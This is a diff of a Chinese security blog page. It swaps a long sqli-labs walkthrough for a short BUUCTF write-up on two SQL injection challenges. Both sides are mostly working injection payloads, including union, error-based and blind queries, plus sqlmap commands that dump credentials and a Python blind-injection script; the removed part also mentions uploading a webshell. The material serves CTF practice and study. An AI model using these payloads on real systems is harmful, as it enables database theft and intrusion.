@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="sqli-labs, Amy">
+    <meta name="keywords" content="BUU做题记录, Amy">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>sqli-labs | Amy</title>
+    <title>BUU做题记录 | Amy</title>
     <link rel="icon" type="image/svg+xml" href="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io@main/favicon.svg">
 
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io@main/libs/awesome/css/all.min.css">
@@ -205,12 +205,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208205152774.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210224152322090.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">sqli-labs</h1>
+                    <h1 class="description center-align post-title">BUU做题记录</h1>
                 </div>
             </div>
         </div>
@@ -351,28 +351,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:
-                    2020-11-28
+                    2021-02-06
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:
-                    2021-02-23
+                    2021-02-25
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:
-                    2.6k
+                    416
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:
-                    12 分
+                    2 分
                 </div>
                 
 
@@ -390,236 +390,56 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h2><p><strong>手动</strong></p>
-<p>先判断注入类型。</p>
-<pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-1/?id=1' and 1=1 --+
-http://127.0.0.1/sqli-labs/Less-1/?id=1' and 1=2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+                <h2 id="CISCN2019-华北赛区-Hack-World"><a href="#CISCN2019-华北赛区-Hack-World" class="headerlink" title="[CISCN2019 华北赛区]Hack World"></a>[CISCN2019 华北赛区]Hack World</h2><p>输入1或2有回显，而一些常见的注入用的符号或者是字母都会被过滤掉</p>
+<p>初步判断可能是数字型盲注</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 先测试一下</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>ascii<span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p>第一种传入网站显示正常，第二种传入网站显示不正常。可以看出语句已经被执行。因此说明是单引号类型注入。 先判断字段数。依次递增order by 后面的数值。</p>
-<pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-1/?id=1' order by 1 --+
-http://127.0.0.1/sqli-labs/Less-1/?id=1' order by 2 --+
-http://127.0.0.1/sqli-labs/Less-1/?id=1' order by 3 --+
-http://127.0.0.1/sqli-labs/Less-1/?id=1' order by 4 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>发现注入成功！</p>
+<p>写脚本爆出flag，这里自己写的脚本爆出来的flag有点问题，参考了这位兄弟的文章才改了过来<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/8bb7d057365d">XD_whYe</a></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> time
+url <span class="token operator">=</span> <span class="token string">'http://3e76dcf4-89d8-4a7d-8a25-926d00a331e3.node3.buuoj.cn/index.php'</span>
+flag <span class="token operator">=</span> <span class="token string">''</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token builtin">max</span> <span class="token operator">=</span> <span class="token number">127</span>
+    <span class="token builtin">min</span> <span class="token operator">=</span> <span class="token number">0</span>
+    <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        s <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">max</span> <span class="token operator">+</span> <span class="token builtin">min</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>
+        payload <span class="token operator">=</span> <span class="token string">'1^(ascii(substr((select(flag)from(flag)),'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>
+            i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">',1))&gt;'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">')'</span>
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span>
+        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.005</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">'Hello, glzjin wants a girlfriend.'</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token builtin">max</span> <span class="token operator">=</span> s
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token builtin">min</span> <span class="token operator">=</span> s
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">max</span> <span class="token operator">-</span> <span class="token builtin">min</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">max</span><span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>发现3时不报错,而4时报错，所以字段数是3。<br>接下来用联合查询判断显示位。首先要让id变成一个不存在的值以便显示出来的值都是union语句执行的结果。我使用的是-1。</p>
-<pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>先试一下一些常见的账号密码，都没用</p>
+<p>空格和=被过滤了，可以用()和like来代替</p>
+<p>这题试了一下应该是报错注入，需要用到<code>^</code>连接函数形成异或</p>
+<p>payload:<code>?username=admin&amp;password=admin'^extractvalue(1,concat(0x7e,(select(database()))))%23</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210225090738803.png" alt="image-20210225090738803"></p>
+<p>成功显示数据库</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 爆表</span>
+?username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span>admin<span class="token string">'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('</span>geek<span class="token string">')))))%23
 
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194701808.png" alt="image-20210208194701808"></p>
-<p>显示位是2,3。所以可以在 2,3位置进行sql注入</p>
-<p>这里涉及到几个函数</p>
-<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/94594406">mysql中concat()，concat_ws()，group_concat()的用法</a></p>
-<pre class="line-numbers language-none"><code class="language-none">爆库:http://127.0.0.1/sqli-labs/Less-1/?id=100' union select 1,2,database() --+
-爆表:http://127.0.0.1/sqli-labs/Less-1/?id=100' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
-爆字段:http://127.0.0.1/sqli-labs/Less-1/?id=100' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' --+
-爆值:http://127.0.0.1/sqli-labs/Less-1/?id=100' union select 1,2,group_concat(username,0x3a,password,0x3c2f62723e) from security.users --+ 加个换行符要好看点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+-- 爆字段
+?username=admin&amp;password=admin'</span><span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token operator">like</span><span class="token punctuation">(</span><span class="token string">'H4rDsq1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
 
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194722570.png" alt="image-20210208194722570"></p>
-<p><strong>sqlmap</strong></p>
-<p>为了方便截图,后面加个输出参数为0</p>
-<pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql –batch –v 0
-sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql --dbs --batch -v 0 #查有哪些模式
-sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql -D security --tables  --batch -v 0 #查表
-sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql -D security -T users --columns  --batch -v 0 #查字段
-sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql -D security -T users -C username,password --dump --batch -v 0 #看用户名和密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token comment">-- 爆值</span>
+?username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span>admin'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>geek<span class="token punctuation">.</span>H4rDsq1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
 
-<p>结果:</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194906554.png" alt="image-20210208194906554"></p>
-<h2 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h2><p> <strong>手动</strong></p>
-<p>第二个和第一个差不多,但是是数值型注入,把1后面的引号去掉就行</p>
-<pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-2/?id=1 and 1=1 --+
-http://127.0.0.1/sqli-labs/Less-2/?id=1 and 1=2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<span class="token comment">-- 这里flag并不是完整的，看了一下网上的说法，可以使用left和right函数分别读取</span>
+?username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span>admin<span class="token operator">%</span><span class="token number">27</span><span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span><span class="token keyword">left</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>geek<span class="token punctuation">.</span>H4rDsq1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
+?username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span>admin<span class="token operator">%</span><span class="token number">27</span><span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span><span class="token keyword">right</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>geek<span class="token punctuation">.</span>H4rDsq1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>接下来和less1一样</p>
-<p><strong>sqlmap</strong></p>
-<p>套less1的语句就行</p>
-<h2 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h2><p> <strong>手动</strong></p>
-<p>先传id=1 好家伙</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194806106.png" alt="image-20210208194806106"></p>
-<p>要构造闭合,上一篇slq注入的文章写过</p>
-<pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-3/?id=1') and 1=1 --+
-http://127.0.0.1/sqli-labs/Less-3/?id=1') and 1=2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>接下来的和上面一样操作</p>
-<p> <strong>sqlmap</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-3/?id=1') --technique UE --dbms mysql -D security -T users -C username,password --dump --batch -v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>第一个还是可以</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194824485.png" alt="image-20210208194824485"></p>
-<h2 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h2><p><strong>手动</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195001271.png" alt="image-20210208195001271"></p>
-<pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-4/?id=1"
-和上面的类似,只需要闭合"")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>接下来和上面的操作一样</p>
-<p><strong>sqlmap</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-4/?id=1 --technique UE --dbms mysql -D security -T users -C username,password --dump --batch -v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-<p><strong>前面四题其实差不多,只是闭合符号的区别</strong></p>
-<h2 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h2><p>这题没有显位,所以判断是布尔盲注,时间盲注,或者是报错注入</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195017876.png" alt="image-20210208195017876"></p>
-<p><strong>手动</strong></p>
-<p>通过一个left函数来判断,一个一个去试太费时间了,可以用burp suite爆破</p>
-<pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-5/?id=1' and left((select database()),2)="se" --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200311822.png" alt="image-20210208200311822"></p>
-<p>后面的就和前面差不多了</p>
-<p><strong>sqlmap</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">看下有哪些数据库
-python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --technique B --dbms mysql --dbs --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195053128.png" alt="image-20210208195053128"></p>
-<pre class="line-numbers language-none"><code class="language-none">查看security数据库的表
-python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --technique B --dbms mysql -D security --tables --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195747622.png" alt="image-20210208195747622"></p>
-<pre class="line-numbers language-none"><code class="language-none">查看字段
-python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --technique B --dbms mysql -D security -T users --columns --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195649270.png" alt="image-20210208195649270"></p>
-<pre class="line-numbers language-none"><code class="language-none">查看用户名和密码
- python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --technique B --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195813166.png" alt="image-20210208195813166"></p>
-<h2 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h2><p>这题和上面less5差不多，就是闭合符号不一样，把单引号改成双引号就可以了</p>
-<h2 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h2><p><strong>手动</strong></p>
-<p>先确定是如何闭合的，如下</p>
-<pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-7?id=1')) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195934527.png" alt="image-20210208195934527"></p>
-<p>根据提示，目测是对数据库文件进行操作，上传一个一句话木马试试(因为我是装在自己的电脑上的所以知道绝对路径)</p>
-<p><strong>sqlmap</strong></p>
-<p>布尔盲注直接跑</p>
-<pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-7/?id=1 --technique B --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h2><p><strong>手动</strong></p>
-<p>这题也是布尔盲注，payload和第五题差不多，可以用left函数或ASCII函数来一个一个来判断，还是用sqlmap舒服🤣</p>
-<p><strong>sqlmap</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u 'http://127.0.0.1/sqli-labs/Less-8/?id=1' --technique B --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h2><p>时间注入</p>
-<p><strong>手动</strong></p>
-<p>又是一个一个去试，可以采用ASCII函数采用二分法来找到正确的字符，然后配合sleep(5)函数来构造</p>
-<p><strong>sqlmap</strong></p>
-<p>把technique改成T来试试</p>
-<pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u 'http://127.0.0.1/sqli-labs/Less-9/?id=1' --technique T --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h2><p><strong>手动</strong></p>
-<p>还是时间注入,只是和上一题的拼接方式不一样</p>
-<p>先构造闭合，试了一下下面几个，马上就显示you are in了，说明没有被执行</p>
-<pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-10/?id=1' and sleep(5)--+
-http://127.0.0.1/sqli-labs/Less-10/?id=1') and sleep(5)--+
-http://127.0.0.1/sqli-labs/Less-10/?id=1')) and sleep(5)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>最终正确的闭合是</p>
-<pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-10/?id=1" and sleep(5)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>然后就和上题less9一样操作了</p>
-<p><strong>sqlmap</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-10/?id=1 --technique T --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h2><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208195951851.png" alt="image-20210208195951851"></p>
-<p>从这以后就全部变成post注入了</p>
-<p><strong>手动</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">username部分
-username=admin' union select 1,database()# 把username换成admin,后面的操作就和第一题差不多了
-username=1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#
-username=1' union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'#
-username=1' union select 1,group_concat(username,0x3a,password,0x3c2f62723e) from security.users#
-
-password可以随便输,因为后台已经注释掉了
-SELECT username, password FROM users WHERE username='1' union select 1,group_concat(username,0x3a,password,0x3c2f62723e) from security.users#' and password='$passwd' LIMIT 0,1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200012353.png" alt="image-20210208200012353"></p>
-<p><strong>sqlmap</strong></p>
-<p>先buspsuite抓包，看看data数据的格式，然后再拿sqlmap跑就可以了</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200030999.png" alt="image-20210208200030999"></p>
-<pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-11/ --data "uname=admin &amp;passwd=admin &amp;submit=Submit" --dbms mysql -D security -T users --threads 5 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h2><p>不断尝试几次时候发现，这题和less11一模一样，只是闭合方式变了，变成了”）</p>
-<h2 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h2><p><strong>手动</strong></p>
-<p>发现用‘)闭合之后没有显示位，那就试试报错注入</p>
-<p>尝试使用extractvalue()函数</p>
-<p>直接extractvalue(1，database())好像有点问题，查略一番资料后发现加个concat就正常了</p>
-<pre class="line-numbers language-none"><code class="language-none">username=1') and extractvalue(1,concat(1,database()))#
-username=1') and extractvalue(1,concat(1,(select (table_name) from information_schema.tables where table_schema=database() limit 0,1)))#
-username=1') and extractvalue(1,concat(1,(select (column_name) from information_schema.columns where table_name='users' limit 0,1)))#
-username=1') and extractvalue(1,concat(1,(select concat(username,0x3a,password) from security.users limit 1,1)))#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200352121.png" alt="image-20210208200352121"></p>
-<p><strong>sqlmap</strong></p>
-<p>因为之前已经抓过包,post请求应该是一样的,所以和命令和第十一题是一样</p>
-<h2 id="less14"><a href="#less14" class="headerlink" title="less14"></a>less14</h2><p>和上一题一样，只是闭合变成了“</p>
-<h2 id="less15"><a href="#less15" class="headerlink" title="less15"></a>less15</h2><p><strong>手动</strong></p>
-<p>这题不能用报错注入，试试其他的吧</p>
-<p>先试试数据库的长度</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200413051.png" alt="image-20210208200413051"></p>
-<p>依旧使用left函数来判断</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200429516.png" alt="image-20210208200429516"></p>
-<p>然后就是一个一个去试啦，也可以借助一些脚本，或者是burpsuite</p>
-<p><strong>sqlmap</strong></p>
-<p>然它自己去测吧，从结果来看，可以指定使用布尔盲注或者是时间盲注，这样子跑的会快一些</p>
-<pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-15/ --data "uname=admin &amp;passwd=admin &amp;submit=Submit" --dbms mysql -D security -T users --threads 5 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="less16"><a href="#less16" class="headerlink" title="less16"></a>less16</h2><p>和15题一样，只是闭合变成了”）</p>
-<p>sqlmap的话用上面的跑不出了，在网上查到sqlmap默认的输出等级是1，这里把输出等级调高一点就好了</p>
-<h2 id="less17"><a href="#less17" class="headerlink" title="less17"></a>less17</h2><p><strong>手动</strong></p>
-<p>这一关开始看着有点懵，提示要重置密码</p>
-<p>查看post内容，发现是在passwd处</p>
-<p>我的理解是接收到用户POST提交的uname和passwd后，根据uname查询数据库的username和password，若uname存在则用passwd替换password，若不存在则显示slap1.jpg</p>
-<p>所以注入的时候要在这里，用户名的话就用admin吧</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200502414.png" alt="image-20210208200502414"></p>
-<p>需要用到的是updatexml函数</p>
-<pre class="line-numbers language-none"><code class="language-none">uname=admin&amp;passwd=123123' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 3,1)),1)#&amp;sumit=Submit
-接下来的和前面差不多<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><strong>sqlmap</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -r 抓包保存的文件路径 --tech E --dbms mysql -D security -T users --threads 5 --level=4 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-<h2 id="less18"><a href="#less18" class="headerlink" title="less18"></a>less18</h2><p><strong>手动</strong></p>
-<p>登录失败只会显示ip地址,登录成功会显示user agent</p>
-<p>随后发现username和password都被转义了,构造不了闭合条件</p>
-<p>猜测可能可以通过user agent来注入,看了下源码,确实如此</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200520106.png" alt="image-20210208200520106"></p>
-<p>谷歌的hackbar不知道为什么有点问题</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200534798.png" alt="image-20210208200534798"></p>
-<p>直接用burpsuite试试</p>
-<p>payload为</p>
-<pre class="line-numbers language-none"><code class="language-none">' or updatexml(1,concat(0x7e,(database())),1) or '1' = '1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>可以看到已经爆出来了,接下来就是常规操作啦</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208200642152.png" alt="image-20210208200642152"></p>
-<p><strong>sqlmap</strong></p>
